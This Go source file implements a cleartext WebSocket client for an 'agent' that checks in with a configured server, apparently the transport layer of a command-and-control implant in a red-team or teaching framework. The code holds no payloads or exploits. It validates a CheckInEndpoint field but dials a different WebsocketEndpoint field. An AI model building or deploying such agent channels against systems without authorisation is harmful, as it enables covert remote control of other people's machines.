package comm

import (
	"fmt"
	"github.com/gorilla/websocket"
	"log"
	"net/url"
	"numinon_shadow/internal/agent/config"
	"sync"
	"time"
)

// WsClearCommunicator implements Communicator for cleartext WebSocket (ws://).
type WsClearCommunicator struct {
	agentConfig config.AgentConfig
	conn        *websocket.Conn  // The active websocket connection
	connMtx     sync.Mutex       // Mutex to protect concurrent access to conn
	dialer      websocket.Dialer // Dialer for establishing connections
}

// NewWsClearCommunicator creates a WS communicator.
func NewWsClearCommunicator(cfg config.AgentConfig) (*WsClearCommunicator, error) {

	err := BasicValidateWS(cfg)
	if err != nil {
		return nil, err
	}

	// Configure the dialer (can set timeouts, etc.)
	dialer := websocket.Dialer{
		Proxy:            websocket.DefaultDialer.Proxy, // Use system proxy settings
		HandshakeTimeout: 15 * time.Second,              // Timeout for the WS handshake
	}

	log.Printf("|COMM INIT|-> Initializing WS Clear Communicator for ws://%s:%s%s",
		cfg.ServerIP, cfg.ServerPort, cfg.CheckInEndpoint)

	return &WsClearCommunicator{
		agentConfig: cfg,
		dialer:      dialer,
		// conn is initially nil
	}, nil
}

func BasicValidateWS(cfg config.AgentConfig) error {
	if cfg.Protocol != config.WebsocketClear {
		return fmt.Errorf("mismatched config: NewWsClearCommunicator called with protocol %s", cfg.Protocol)
	}
	if cfg.ServerIP == "" || cfg.ServerPort == "" || cfg.CheckInEndpoint == "" {
		// CheckInEndpoint is used as the path for the WS connection (e.g., /ws)
		return fmt.Errorf("config requires ServerIP, ServerPort, and CheckInEndpoint (path) for WS")
	}
	return nil
}

// Connect establishes the WebSocket connection.
func (c *WsClearCommunicator) Connect() error {
	c.connMtx.Lock()
	// If already connected, disconnect first or return success? Let's disconnect first.
	if c.conn != nil {
		log.Println("|COMM WS| Connect called but already connected. Closing existing connection.")
		c.conn.Close()
		c.conn = nil
	}
	c.connMtx.Unlock() // Unlock before potentially long dial operation

	// Construct URL: ws://host:port/path
	targetURL := url.URL{
		Scheme: "ws", // Use ws scheme
		Host:   fmt.Sprintf("%s:%s", c.agentConfig.ServerIP, c.agentConfig.ServerPort),
		Path:   c.agentConfig.WebsocketEndpoint,
	}
	fullURL := targetURL.String()

	log.Printf("|COMM WS|-> Attempting to connect to %s...", fullURL)

	// Dial the server
	// First argument = fullURL
	// The second argument is http.Header, can be nil or used to pass custom headers (like AgentID)
	header := map[string][]string{
		"User-Agent": {"PunkinAgent/0.1-WS-Dialer"},
		"Agent-ID":   {c.agentConfig.UUID},
	}

	// Use WS Dialer to create the connection
	conn, resp, err := c.dialer.Dial(fullURL, header)
	if err != nil {
		// Log response details if available, helps debug handshake issues
		errMsg := fmt.Sprintf("WS Dial error to %s: %v", fullURL, err)
		if resp != nil {
			errMsg = fmt.Sprintf("%s (Handshake Response: %s)", errMsg, resp.Status)
			// Optionally read and log resp.Body here for more detail
		} else {
			errMsg = fmt.Sprintf("%s (No response received)", errMsg)
		}
		log.Printf("|❗ERR COMM WS| %s", errMsg)
		return fmt.Errorf(errMsg) // Return the specific error
	}
	// Handshake successful!

	log.Printf("|COMM WS|-> WebSocket connection established successfully to %s", fullURL)

	// Here we now "save" our actual connection object
	// Goes from nil (we did not instantiate in constructor)
	// To actual object we receive post-successful handshake
	c.connMtx.Lock()
	c.conn = conn
	c.connMtx.Unlock()
	return nil
}
